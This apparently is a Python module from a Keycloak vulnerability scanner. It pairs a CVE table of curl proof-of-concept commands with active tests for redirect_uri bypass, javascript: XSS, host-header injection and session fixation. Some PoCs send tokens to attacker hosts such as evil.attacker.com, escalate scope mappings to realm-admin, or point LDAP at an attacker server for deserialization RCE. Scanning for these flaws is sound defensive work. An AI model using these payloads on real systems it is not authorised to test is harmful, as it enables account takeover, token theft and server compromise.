#!/usr/bin/env python3

import secrets
from utils.style import Colors, Identify
from utils.output import get_reporter

_CVE_DB = {
    "CVE-2023-0091": {
        "fixed": "20.0.3",
        "severity": "critical",
        "cvss": 9.8,
        "name": "mTLS certificate chain validation bypass",
        "desc": "Client with valid cert can impersonate any other client.",
        "poc": (
            "curl --cert client.crt --key client.key \\\n"
            "     -X POST '{base}/realms/{realm}/protocol/openid-connect/token' \\\n"
            "     -d 'client_id=VICTIM_CLIENT&grant_type=client_credentials'"
        ),
    },
    "CVE-2023-6291": {
        "fixed": "23.0.0",
        "severity": "high",
        "cvss": 8.1,
        "name": "Redirect URI validation bypass",
        "desc": "Bypass of redirect_uri validation — token theft possible.",
        "poc": (
            "curl '{base}/realms/{realm}/protocol/openid-connect/auth"
            "?client_id=CLIENT&response_type=code"
            "&redirect_uri=https://keycloak.org@evil.attacker.com'"
        ),
    },
    "CVE-2024-1249": {
        "fixed": "24.0.3",
        "severity": "high",
        "cvss": 8.1,
        "name": "Redirect URI validation logic flaw",
        "desc": "Similar to CVE-2023-6291 — redirect_uri bypass for token hijack.",
        "poc": (
            "curl '{base}/realms/{realm}/protocol/openid-connect/auth"
            "?client_id=CLIENT&response_type=code"
            "&redirect_uri=https://keycloak.org@evil.attacker.com'"
        ),
    },
    "CVE-2020-1728": {
        "fixed": "9.0.2",
        "severity": "high",
        "cvss": 8.8,
        "name": "Account takeover via unverified email change",
        "desc": "Account takeover by changing email without verification.",
        "poc": (
            "curl -X PUT '{base}/realms/{realm}/account/' \\\n"
            "     -H 'Authorization: Bearer YOUR_TOKEN' \\\n"
            "     -H 'Content-Type: application/json' \\\n"
            "     -d '{\"email\":\"victim@company.com\"}'"
        ),
    },
    "CVE-2024-7318": {
        "fixed": "24.0.6",
        "severity": "high",
        "cvss": 7.1,
        "name": "JARM bypass of CVE-2023-6134",
        "desc": "Bypass of XSS fix via JARM/form_post.jwt with wildcard redirect_uri.",
        "poc": (
            "curl '{base}/realms/{realm}/protocol/openid-connect/auth"
            "?client_id=CLIENT&response_type=code"
            "&response_mode=form_post.jwt&redirect_uri=https://evil.com/*'"
        ),
    },
    "CVE-2023-6134": {
        "fixed": "23.0.3",
        "severity": "high",
        "cvss": 7.1,
        "name": "Reflected XSS via wildcard redirect_uri",
        "desc": "XSS via wildcard in redirect_uri (incomplete fix of CVE-2020-10748).",
        "poc": (
            "curl '{base}/realms/{realm}/protocol/openid-connect/auth"
            "?client_id=CLIENT&redirect_uri=javascript:alert(document.domain)*'"
        ),
    },
    "CVE-2020-10748": {
        "fixed": "11.0.0",
        "severity": "high",
        "cvss": 7.1,
        "name": "XSS via redirect_uri with wildcard",
        "desc": "JavaScript injection via malicious scheme in wildcard redirect_uri.",
        "poc": (
            "curl '{base}/realms/{realm}/protocol/openid-connect/auth"
            "?client_id=CLIENT&redirect_uri=javascript:alert(document.domain)*'"
        ),
    },
    "CVE-2018-14655": {
        "fixed": "4.6.0",
        "severity": "high",
        "cvss": 7.5,
        "name": "Open Client Registration endpoint",
        "desc": "Unauthenticated client registration allows creation of malicious OAuth clients.",
        "poc": (
            "curl -X POST '{base}/realms/{realm}/clients-registrations/default' \\\n"
            "     -H 'Content-Type: application/json' \\\n"
            "     -d '{\"clientId\":\"evil-client\",\"redirectUris\":[\"https://attacker.com/*\"]}'"
        ),
    },
    "CVE-2021-3513": {
        "fixed": "13.0.0",
        "severity": "high",
        "cvss": 7.5,
        "name": "Token Exchange vulnerability",
        "desc": "Token exchange without proper validation — privilege escalation.",
        "poc": (
            "curl -X POST '{base}/realms/{realm}/protocol/openid-connect/token' \\\n"
            "     -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \\\n"
            "     -d 'subject_token=VALID_TOKEN' \\\n"
            "     -d 'requested_token_type=urn:ietf:params:oauth:token-type:refresh_token'"
        ),
    },
    "CVE-2022-3782": {
        "fixed": "20.0.0",
        "severity": "medium",
        "cvss": 6.5,
        "name": "CSRF token bypass in Account Console",
        "desc": "CSRF bypass in Account Console allows unauthorized actions.",
        "poc": None,
    },
    "CVE-2023-0657": {
        "fixed": "21.0.1",
        "severity": "medium",
        "cvss": 5.9,
        "name": "Host header injection",
        "desc": "Host header injection via reverse proxy — cache poisoning risk.",
        "poc": (
            "curl -H 'Host: evil.attacker.com' '{base}/realms/{realm}/.well-known/openid-configuration'"
        ),
    },
    "CVE-2023-2585": {
        "fixed": "21.1.0",
        "severity": "medium",
        "cvss": 5.3,
        "name": "Account lockout via multiple login attempts",
        "desc": "Attacker can lock out other users' accounts.",
        "poc": None,
    },
    "CVE-2023-1664": {
        "fixed": "21.0.2",
        "severity": "medium",
        "cvss": 6.1,
        "name": "Open redirect via state parameter",
        "desc": "Open redirect via unvalidated state parameter.",
        "poc": (
            "curl '{base}/realms/{realm}/protocol/openid-connect/auth"
            "?client_id=CLIENT&response_type=code&redirect_uri={realm}/callback"
            "&state=https://evil.attacker.com/phish'"
        ),
    },
    "CVE-2022-1245": {
        "fixed": "17.0.0",
        "severity": "medium",
        "cvss": 6.5,
        "name": "Session fixation vulnerability",
        "desc": "Session fixation via AUTH_SESSION_ID cookie manipulation.",
        "poc": None,
    },
    "CVE-2022-2256": {
        "fixed": "18.0.2",
        "severity": "medium",
        "cvss": 6.1,
        "name": "Reflected XSS in Account Console",
        "desc": "Reflected XSS in Account Console.",
        "poc": None,
    },
    "CVE-2023-6563": {
        "fixed": "23.0.4",
        "severity": "medium",
        "cvss": 5.3,
        "name": "Offline tokens memory exhaustion DoS",
        "desc": "DoS via memory exhaustion using offline tokens.",
        "poc": None,
    },
    "CVE-2023-6787": {
        "fixed": "22.0.8",
        "severity": "medium",
        "cvss": 6.5,
        "name": "Path traversal in Freemarker templates",
        "desc": "File read via path traversal in Freemarker templates.",
        "poc": None,
    },
    "CVE-2021-20323": {
        "fixed": "15.1.0",
        "severity": "low",
        "cvss": 4.3,
        "name": "Missing security headers on REST API",
        "desc": "Security headers missing on REST API responses.",
        "poc": None,
    },
    "CVE-2024-1132": {
        "fixed": "24.0.1",
        "severity": "low",
        "cvss": 4.3,
        "name": "Phishing via error page messages",
        "desc": "Arbitrary messages in error pages enable phishing via error_description.",
        "poc": (
            "curl '{base}/realms/{realm}/protocol/openid-connect/auth"
            "?error=phishing&error_description=Your+session+expired.+Login+at+evil.com'"
        ),
    },

    # ── 2025 / 2026 ──────────────────────────────────────────────────────────

    "CVE-2026-7507": {
        "fixed": "26.6.2",
        "severity": "high",
        "cvss": 7.5,
        "name": "Session fixation via /login-actions/restart → pre-auth ATO",
        "desc": (
            "Attacker pre-stages an auth session, sends victim a /login-actions/restart link. "
            "Victim's SSO cookie authenticates transparently into the attacker's flow → full ATO "
            "without credentials, including admin accounts."
        ),
        "poc": (
            "# 1. Attacker initiates auth flow, captures session_code from redirect URL\n"
            "# 2. Craft link:\n"
            "curl '{base}/realms/{realm}/login-actions/restart"
            "?session_code=ATTACKER_SESSION&client_id=CLIENT&tab_id=TAB'\n"
            "# 3. Victim with active SSO clicks → authenticates into attacker session"
        ),
    },
    "CVE-2025-12390": {
        "fixed": "26.5.0",
        "severity": "high",
        "cvss": 8.1,
        "name": "Cross-user session contamination via AUTH_SESSION_ID reuse",
        "desc": (
            "When a second user starts a login and the browser sends a stale AUTH_SESSION_ID "
            "from a previous session, KC reuses the root auth session ID without checking the "
            "authenticating user identity → refreshed tokens contain wrong user's identity → ATO."
        ),
        "poc": None,
    },
    "CVE-2026-9802": {
        "fixed": "26.6.3",
        "severity": "high",
        "cvss": 7.5,
        "name": "Refresh token replay after cluster restart (revokeRefreshToken bypass)",
        "desc": (
            "When revokeRefreshToken=true and persistent session storage is in use, "
            "a cluster restart resets internal timing → previously revoked refresh tokens become replayable."
        ),
        "poc": (
            "curl -X POST '{base}/realms/{realm}/protocol/openid-connect/token' \\\n"
            "     -d 'grant_type=refresh_token&client_id=CLIENT&refresh_token=CAPTURED_REVOKED_TOKEN'"
        ),
    },
    "CVE-2025-7784": {
        "fixed": "26.3.0",
        "severity": "high",
        "cvss": 7.2,
        "name": "FGAPv2 privilege escalation: manage-users → realm-admin",
        "desc": (
            "When Fine-Grained Admin Permissions (FGAPv2) are enabled, an admin with manage-users "
            "role can escalate to realm-admin due to missing privilege enforcement in the admin REST API."
        ),
        "poc": None,
    },
    "CVE-2026-9795": {
        "fixed": "26.6.4",
        "severity": "critical",
        "cvss": 9.1,
        "name": "FGAPv2 scope mapping privilege escalation: manage-clients → realm-admin",
        "desc": (
            "Admin with manage-clients permission can assign any realm role (including realm-admin) "
            "to a client's scope mapping via the admin REST API — role is then injected into user tokens "
            "accessing that client. Full realm compromise."
        ),
        "poc": (
            "curl -X POST '{base}/admin/realms/{realm}/clients/CLIENT_UUID/scope-mappings/realm' \\\n"
            "     -H 'Authorization: Bearer MANAGE_CLIENTS_TOKEN' \\\n"
            "     -H 'Content-Type: application/json' \\\n"
            "     -d '[{\"name\":\"realm-admin\"}]'"
        ),
    },
    "CVE-2026-2092": {
        "fixed": "26.6.0",
        "severity": "high",
        "cvss": 7.7,
        "name": "SAML encrypted assertion injection via broker",
        "desc": (
            "SAML broker doesn't validate encrypted assertions when the SAML response is not signed. "
            "Attacker with a valid signed assertion can inject an encrypted assertion for an arbitrary "
            "principal → identity impersonation without credentials."
        ),
        "poc": None,
    },
    "CVE-2026-3047": {
        "fixed": "26.6.0",
        "severity": "high",
        "cvss": 7.5,
        "name": "Disabled SAML client SSO session bypass",
        "desc": (
            "A disabled SAML client configured as IdP-initiated broker landing target can still "
            "complete login and establish an SSO session → attacker gains access to all enabled "
            "clients without re-authentication."
        ),
        "poc": None,
    },
    "CVE-2025-14559": {
        "fixed": "26.3.0",
        "severity": "medium",
        "cvss": 6.5,
        "name": "Token exchange issues tokens for disabled users",
        "desc": (
            "Token exchange endpoint (grant_type=urn:ietf:params:oauth:grant-type:token-exchange) "
            "doesn't validate whether the requested_subject is an active/enabled user → "
            "tokens issued for explicitly disabled accounts."
        ),
        "poc": (
            "curl -X POST '{base}/realms/{realm}/protocol/openid-connect/token' \\\n"
            "     -H 'Authorization: Bearer YOUR_VALID_TOKEN' \\\n"
            "     -d 'grant_type=urn:ietf:params:oauth:grant-type:token-exchange' \\\n"
            "     -d 'requested_subject=DISABLED_USER_UUID' \\\n"
            "     -d 'requested_token_type=urn:ietf:params:oauth:token-type:access_token'"
        ),
    },
    "CVE-2025-13467": {
        "fixed": "26.2.0",
        "severity": "critical",
        "cvss": 8.8,
        "name": "LDAP User Federation RMI deserialization → RCE",
        "desc": (
            "Realm admin can configure LDAP connectionUrl to a malicious server and enable "
            "Referral:follow → KC deserializes untrusted Java object from RMI → RCE on the server."
        ),
        "poc": (
            "# Requires realm-admin token:\n"
            "curl -X PUT '{base}/admin/realms/{realm}/components/LDAP_COMPONENT_ID' \\\n"
            "     -H 'Authorization: Bearer ADMIN_TOKEN' \\\n"
            "     -H 'Content-Type: application/json' \\\n"
            "     -d '{\"config\":{\"connectionUrl\":[\"ldap://evil.attacker.com:1389\"],"
            "\"usePasswordModifyExtendedOp\":[\"false\"],\"referral\":[\"follow\"]}}'"
        ),
    },
    "CVE-2025-11419": {
        "fixed": "26.2.0",
        "severity": "high",
        "cvss": 7.5,
        "name": "TLS client-initiated renegotiation DoS",
        "desc": (
            "Default JDK setting permits TLS 1.2 client-initiated renegotiation. "
            "Unauthenticated attacker repeatedly initiates TLS renegotiation → CPU exhaustion DoS."
        ),
        "poc": None,
    },
}

# CVEs where the active test could harm real users or cause an outage — skip
_DESTRUCTIVE = {"CVE-2023-6563", "CVE-2023-2585", "CVE-2025-11419"}

# CVEs that require a valid bearer token or special setup — manual test only
_NEEDS_TOKEN = {
    "CVE-2023-0091",   # mTLS cert required
    "CVE-2020-1728",   # bearer token required
    "CVE-2021-3513",   # bearer token required
    "CVE-2026-9802",   # captured refresh token required
    "CVE-2025-7784",   # manage-users token required
    "CVE-2026-9795",   # manage-clients token required
    "CVE-2026-2092",   # SAML IdP setup required
    "CVE-2026-3047",   # SAML IdP setup required
    "CVE-2025-14559",  # valid bearer token required
    "CVE-2025-13467",  # realm-admin token required
    "CVE-2025-12390",  # multi-session browser scenario required
}


def _test_redirect_uri_bypass(s, realm, client_id):
    """CVE-2023-6291 / CVE-2024-1249: redirect_uri bypass via @evil trick."""
    marker = "evil-unkeycloak.invalid"
    try:
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={
                "client_id": client_id,
                "response_type": "code",
                "redirect_uri": f"https://keycloak.org@{marker}",
            },
            allow_redirects=False,
        )
        if r.status_code in (301, 302):
            loc = r.headers.get("Location", "")
            if marker in loc:
                return True, f"Redirected to: {loc[:150]}"
    except Exception:
        pass
    return False, None


def _test_xss_redirect_uri(s, realm, client_id):
    """CVE-2023-6134 / CVE-2020-10748: JS/data URI accepted as redirect_uri."""
    payload = "javascript:alert(document.domain)*"
    try:
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={
                "client_id": client_id,
                "response_type": "code",
                "redirect_uri": payload,
            },
            allow_redirects=False,
        )
        if r.status_code in (301, 302):
            loc = r.headers.get("Location", "")
            if "javascript:" in loc:
                return True, f"Location: {loc[:150]}"
    except Exception:
        pass
    return False, None


def _test_jarm_bypass(s, realm, client_id):
    """CVE-2024-7318: form_post.jwt + wildcard redirect_uri bypass."""
    marker = "evil-unkeycloak.invalid"
    try:
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={
                "client_id": client_id,
                "response_type": "code",
                "response_mode": "form_post.jwt",
                "redirect_uri": f"https://{marker}/*",
            },
            allow_redirects=False,
        )
        # Vulnerable: returns 200 with a form POST instead of rejecting
        if r.status_code == 200 and "<form" in r.text.lower():
            return True, f"Server returned 200 with form content (no redirect_uri rejection)"
    except Exception:
        pass
    return False, None


def _test_host_injection(s, realm, client_id):
    """CVE-2023-0657: Host header value reflected in the response body."""
    marker = f"evil-unkeycloak-{secrets.token_hex(3)}.invalid"
    try:
        r = s.get(
            f"{realm}/.well-known/openid-configuration",
            headers={"Host": marker},
            allow_redirects=False,
        )
        if marker in r.text:
            return True, f"Injected Host '{marker}' reflected in response — cache poisoning possible"
    except Exception:
        pass
    return False, None


def _test_error_description(s, realm, client_id):
    """CVE-2024-1132: error_description param reflected verbatim in error page."""
    marker = f"unkeycloak_{secrets.token_hex(4)}"
    try:
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={"error": "access_denied", "error_description": marker},
            allow_redirects=False,
        )
        if marker in r.text:
            return True, f"Marker '{marker}' reflected — attacker can craft phishing error pages"
    except Exception:
        pass
    return False, None


def _test_session_fixation_restart(s, realm, client_id):
    """CVE-2026-7507: /login-actions/restart accepts session_code without cookie binding."""
    import re
    import requests as _requests
    try:
        # Step 1: Initiate an auth flow to obtain a live session_code
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={"client_id": client_id, "response_type": "code",
                    "redirect_uri": f"{realm}/callback"},
            allow_redirects=True,
        )
        # session_code appears in the login page URL or form action
        m_code = re.search(r'[?&]session_code=([^&"\']+)', r.url)
        m_tab  = re.search(r'[?&]tab_id=([^&"\']+)', r.url)
        if not m_code:
            m_code = re.search(r'session_code=([^&"\'&amp;]+)', r.text)
            m_tab  = re.search(r'tab_id=([^&"\'&amp;]+)', r.text)
        if not m_code:
            return False, None

        session_code = m_code.group(1)
        tab_id = m_tab.group(1) if m_tab else "tab"

        # Step 2: Hit /login-actions/restart from a FRESH session (no bound cookies)
        fresh = _requests.Session()
        fresh.verify = False
        r2 = fresh.get(
            f"{realm}/login-actions/restart",
            params={"session_code": session_code, "client_id": client_id, "tab_id": tab_id},
            allow_redirects=False,
        )
        # Vulnerable: endpoint redirects to login (not to an error page)
        if r2.status_code in (301, 302, 303):
            loc = r2.headers.get("Location", "")
            if "error" not in loc.lower() and ("login-actions" in loc or "authenticate" in loc or loc == ""):
                return True, f"HTTP {r2.status_code} — restart accepted cross-session handle (no cookie validation)"
        elif r2.status_code == 200 and ("password" in r2.text.lower() or "username" in r2.text.lower()):
            return True, "HTTP 200 — login page served without cookie validation"
    except Exception:
        pass
    return False, None


def _test_open_redirect_state(s, realm, client_id):
    """CVE-2023-1664: open redirect via unvalidated state parameter."""
    marker = "evil-unkeycloak.invalid"
    try:
        r = s.get(
            f"{realm}/protocol/openid-connect/auth",
            params={
                "client_id": client_id,
                "response_type": "code",
                "redirect_uri": f"{realm}/callback",
                "state": f"https://{marker}/phish",
            },
            allow_redirects=False,
        )
        if r.status_code in (301, 302):
            loc = r.headers.get("Location", "")
            if marker in loc:
                return True, f"Redirected to state URL: {loc[:150]}"
    except Exception:
        pass
    return False, None


_CVE_TESTS = {
    "CVE-2023-6291":  _test_redirect_uri_bypass,
    "CVE-2024-1249":  _test_redirect_uri_bypass,
    "CVE-2023-6134":  _test_xss_redirect_uri,
    "CVE-2020-10748": _test_xss_redirect_uri,
    "CVE-2024-7318":  _test_jarm_bypass,
    "CVE-2023-0657":  _test_host_injection,
    "CVE-2024-1132":  _test_error_description,
    "CVE-2023-1664":  _test_open_redirect_state,
    "CVE-2026-7507":  _test_session_fixation_restart,
}


def _format_poc(poc: str, realms, client_id: str = "CLIENT") -> str:
    """Replace {base}, {realm}, CLIENT placeholders with actual values."""
    if not poc or not realms:
        return poc
    realm_url = realms[0].rstrip('/')
    realm_name = realm_url.split("/")[-1]
    base = realm_url.split("/realms/")[0] if "/realms/" in realm_url else realm_url
    return (poc
            .replace("{base}", base)
            .replace("{realm}", realm_name)
            .replace("CLIENT_ID", client_id)
            .replace("CLIENT", client_id))


def _parse_ver(v: str):
    try:
        return tuple(int(x) for x in v.split(".")[:3])
    except Exception:
        return (0, 0, 0)


def check_cves(version: str, s=None, realms=None, client_ids=None):
    print(f"{Colors.CYAN} ├ CVE Version Analysis {Colors.RESET}")
    reporter = get_reporter()

    if not version:
        print(f"  └── {Colors.THISTLE}Version unknown — skipping CVE check{Colors.RESET}")
        return

    clean = version.strip().lstrip("<=> ").split(" ")[0].split("+")[0]

    try:
        detected = _parse_ver(clean)
    except Exception:
        print(f"  └── {Colors.THISTLE}Cannot parse version '{version}' for CVE check{Colors.RESET}")
        return

    if detected[0] == 0:
        print(f"  └── {Colors.YELLOW}[!] Detected version '{version}' looks inaccurate "
              f"(Keycloak starts at 1.x.x){Colors.RESET}")
        print(f"       CVE check skipped — version fingerprinting may have matched wrong string")
        print(f"       Tip: check /auth/admin/serverinfo manually or use --verbose")
        return

    print(f"  Checking version {Colors.YELLOW}{version}{Colors.RESET} against {len(_CVE_DB)} known CVEs…")

    sev_colors = {
        "critical": Colors.RED,
        "high":     Colors.RED,
        "medium":   Colors.YELLOW,
        "low":      Colors.BLUE,
    }

    matches = []
    for cve_id, info in _CVE_DB.items():
        if detected < _parse_ver(info["fixed"]):
            matches.append((cve_id, info))

    if not matches:
        print(f"  └── {Colors.GREEN}[OK] No known CVEs matched for version {version}{Colors.RESET}")
        return

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    matches.sort(key=lambda x: (order.get(x[1]["severity"], 4), -x[1]["cvss"]))

    # All client_ids to try, with "account" as fallback (always exists in KC)
    test_clients = list(client_ids) if client_ids else ["account"]
    active_testing = bool(s and realms)

    for cve_id, info in matches:
        color = sev_colors.get(info["severity"], Colors.RESET)
        print(f"  └── {color}[{info['severity'].upper()}]{Colors.RESET} "
              f"{cve_id} (CVSS {info['cvss']}) — {info['name']}")
        print(f"         Fixed in: {info['fixed']}  |  {info['desc']}")

        # --- Active test ---
        reported_confirmed = False
        confirmed_client = test_clients[0]
        confirmed_realm = realms[0].rstrip('/') if realms else ""

        if active_testing:
            if cve_id in _DESTRUCTIVE:
                print(f"         {Colors.YELLOW}[!] Active test skipped (destructive — "
                      f"would affect real users){Colors.RESET}")
            elif cve_id in _NEEDS_TOKEN:
                print(f"         {Colors.THISTLE}[TEST] Requires a valid bearer token "
                      f"— manual test only{Colors.RESET}")
            else:
                test_fn = _CVE_TESTS.get(cve_id)
                if test_fn:
                    confirmed = False
                    detail = None
                    outer_break = False
                    for realm in realms:
                        realm_clean = realm.rstrip('/')
                        for cid in test_clients:
                            try:
                                confirmed, detail = test_fn(s, realm_clean, cid)
                            except Exception:
                                continue
                            if confirmed:
                                confirmed_client = cid
                                confirmed_realm = realm_clean
                                outer_break = True
                                break
                        if outer_break:
                            break

                    if confirmed:
                        print(f"         {Identify.confirmed}")
                        print(f"         CONFIRMED — realm: {confirmed_realm}  client: {confirmed_client}")
                        if detail:
                            print(f"         Detail: {detail}")
                        if reporter:
                            reporter.add(
                                "CVE", info["severity"],
                                f"{cve_id} CONFIRMED: {info['name']}",
                                confirmed_realm,
                                f"client_id={confirmed_client} | {detail or info['desc']}",
                            )
                            reported_confirmed = True
                    else:
                        print(f"         {Colors.GREEN}[TEST] Not reproduced via active test "
                              f"(tested {len(realms)} realm(s) × {len(test_clients)} client(s)){Colors.RESET}")

        # Show PoC with real URLs substituted (use confirmed client if available)
        if info.get("poc"):
            formatted_poc = _format_poc(info["poc"], realms, confirmed_client)
            print(f"         {Colors.THISTLE}PoC:{Colors.RESET} {formatted_poc}")

        # Add version-match finding unless we already added a CONFIRMED entry
        if reporter and not reported_confirmed:
            reporter.add(
                "CVE", info["severity"],
                f"{cve_id}: {info['name']}",
                f"https://nvd.nist.gov/vuln/detail/{cve_id}",
                f"Detected version: {version} | Fixed in: {info['fixed']}",
            )
